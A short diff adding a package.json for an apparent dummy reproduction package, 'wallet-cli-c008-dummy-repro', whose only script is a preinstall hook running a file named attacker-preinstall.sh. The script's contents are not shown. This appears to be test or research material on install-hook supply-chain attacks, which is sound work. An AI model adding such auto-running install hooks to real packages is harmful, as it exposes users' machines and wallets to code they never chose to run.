@@ -1,0 +1,9 @@
+{
+  "name": "wallet-cli-c008-dummy-repro",
+  "version": "0.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall": "bash ./attacker-preinstall.sh"
+  },
+  "packageManager": "pnpm@11.0.8"
+}
